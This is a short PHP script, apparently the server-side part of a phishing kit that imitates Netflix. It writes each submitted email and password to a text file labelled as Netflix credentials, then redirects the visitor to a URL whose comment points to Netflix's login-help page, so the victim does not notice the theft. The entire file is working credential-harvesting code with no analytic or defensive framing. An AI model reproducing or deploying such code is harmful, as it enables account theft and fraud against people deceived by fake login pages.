<?php

file_put_contents("usernames.txt", "Netflix Username: " . $_POST['email'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.netflix.com/us/LoginHelp
header("Location: $url");
exit();
?>